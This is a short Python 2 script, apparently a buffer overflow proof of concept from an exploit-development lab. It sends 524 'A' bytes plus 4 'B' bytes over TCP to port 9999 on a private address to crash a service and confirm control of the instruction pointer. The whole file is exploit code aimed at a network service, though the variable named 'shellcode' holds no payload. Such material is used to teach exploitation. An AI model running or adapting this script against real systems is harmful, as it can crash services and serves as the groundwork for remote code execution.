#!/usr/bin/python
import sys
import socket

crash = "A" * 524 + "B" * 4
shellcode = crash + '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',9999))
	s.send(shellcode)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit()